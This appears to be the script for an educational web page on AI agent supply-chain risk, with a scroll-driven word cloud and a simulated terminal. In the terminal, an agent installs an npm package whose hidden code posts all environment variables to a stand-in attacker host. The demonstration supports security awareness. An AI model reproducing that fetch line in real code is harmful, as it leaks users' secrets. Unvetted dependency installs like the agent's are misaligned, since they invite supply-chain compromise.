// ---------- word cloud ----------
// Grey words scattered around; the red ones light up in reading order as you scroll.
const filler = [
  'models', 'tokens', 'prompts', 'embeddings', 'agents', 'permissions', 'logs', 'packages',
  'dependencies', 'APIs', 'context', 'secrets', 'anomalies', 'pipelines', 'containers',
  'inference', 'supply chain', 'fine-tuning', 'clusters', 'keys', 'retrieval', 'tools',
  'sandbox', 'audit', 'signals', 'vectors', 'alerts', 'policies', 'weights', 'scanners'
];
// focus words, placed roughly left-to-right, top-to-bottom so they read as a sentence
const focus = [
  ['AI', 14, 18], ['can', 38, 30], ['act', 60, 14], ['on its own', 84, 26],
  ['so', 22, 58], ['who', 46, 70], ['checks', 66, 54], ['what it trusts?', 82, 80]
];

const cloud = document.getElementById('cloud');
const line = document.getElementById('cloud-line');
const small = window.innerWidth < 700;

// deterministic pseudo-random so the layout is the same every visit
let seed = 7;
const rand = () => (seed = (seed * 9301 + 49297) % 233280) / 233280;

const taken = focus.map(([, x, y]) => [x, y]);
const free = (x, y) => taken.every(([a, b]) => Math.abs(a - x) > (small ? 22 : 12) || Math.abs(b - y) > 8);
filler.slice(0, small ? 16 : filler.length).forEach(word => {
  let x, y, tries = 0;
  do { x = 6 + rand() * 88; y = 4 + rand() * 92; } while (!free(x, y) && ++tries < 60);
  taken.push([x, y]);
  const el = document.createElement('span');
  el.className = 'w';
  el.textContent = word;
  el.style.left = x + '%';
  el.style.top = y + '%';
  el.style.fontSize = (small ? 0.95 : 1.1) + rand() * (small ? 0.6 : 1.1) + 'rem';
  cloud.appendChild(el);
});
const focusEls = focus.map(([word, x, y]) => {
  const el = document.createElement('span');
  el.className = 'w';
  el.textContent = word;
  el.style.left = x + '%';
  el.style.top = y + '%';
  el.style.fontSize = small ? '1.6rem' : '2.6rem';
  cloud.appendChild(el);
  return el;
});

// ---------- incident terminal ----------
const screen = document.getElementById('screen');
const stamp = document.getElementById('stamp');
const lookBtn = document.getElementById('look');
const frames = [
  `<span class="dim">agent ›</span> I need something to format dates.
<span class="dim">agent ›</span> searching packages…`,
  `<span class="dim">agent ›</span> I need something to format dates.
<span class="dim">agent ›</span> searching packages…
<span class="dim">agent ›</span> found <b>tiny-dates</b> · 4,212 weekly downloads
<span class="dim">$</span> npm install tiny-dates
<span class="ok">✓ added 1 package in 1.2s</span>`,
  `<span class="dim">// tiny-dates/index.js</span>
export function format(d) {
  return d.toLocaleDateString();
}

<span class="dim">// … 300 more lines …</span>`,
  `<span class="dim">// tiny-dates/index.js</span>
export function format(d) {
  return d.toLocaleDateString();
}

<span class="dim">// … 300 more lines …</span>
<span class="bad">fetch("https://x9-cdn.io/c", {
  method: "POST",
  body: JSON.stringify(process.env)
});</span>`
];

const beats = [...document.querySelectorAll('.beat')];
let opened = false;
let current = -1;
function showBeat(i) {
  if (i === current) return;
  current = i;
  beats.forEach((b, j) => b.classList.toggle('on', j === i));
  screen.innerHTML = frames[i];
  stamp.classList.toggle('on', i === 3);
}

lookBtn.addEventListener('click', () => {
  opened = true;
  showBeat(3);
  // nudge the page so the last beat stays in view as the reader continues
  const sec = document.querySelector('.incident');
  const target = sec.offsetTop + (sec.offsetHeight - innerHeight) * 0.8;
  if (scrollY < target) window.scrollTo({ top: target, behavior: 'smooth' });
});

// ---------- scroll driver for the pinned scenes ----------
const progress = el => {
  const r = el.getBoundingClientRect();
  return Math.min(1, Math.max(0, -r.top / (r.height - innerHeight)));
};
const cloudSec = document.querySelector('.cloud-wrap');
const incSec = document.querySelector('.incident');

function onScroll() {
  // cloud: light words one by one between 10% and 70%, then show the sentence
  const p = progress(cloudSec);
  const lit = Math.floor((p - 0.08) / 0.62 * focusEls.length);
  focusEls.forEach((el, i) => el.classList.toggle('on', i < lit));
  cloud.classList.toggle('dim', lit > 0);
  line.classList.toggle('show', p > 0.74);

  // incident: four beats; the last one only scrolls in once the reader has looked
  const q = progress(incSec);
  let beat = q < 0.22 ? 0 : q < 0.5 ? 1 : 2;
  if (q > 0.75 || opened) beat = Math.max(beat, q > 0.75 ? 3 : 2);
  if (opened && q > 0.5) beat = 3;
  showBeat(beat);
}
addEventListener('scroll', onScroll, { passive: true });
addEventListener('resize', onScroll);
onScroll();

// ---------- gentle reveals ----------
const io = new IntersectionObserver(es => es.forEach(e => {
  if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); }
}), { threshold: 0.15 });
document.querySelectorAll('.reveal').forEach(el => io.observe(el));

document.getElementById('year').textContent = new Date().getFullYear();
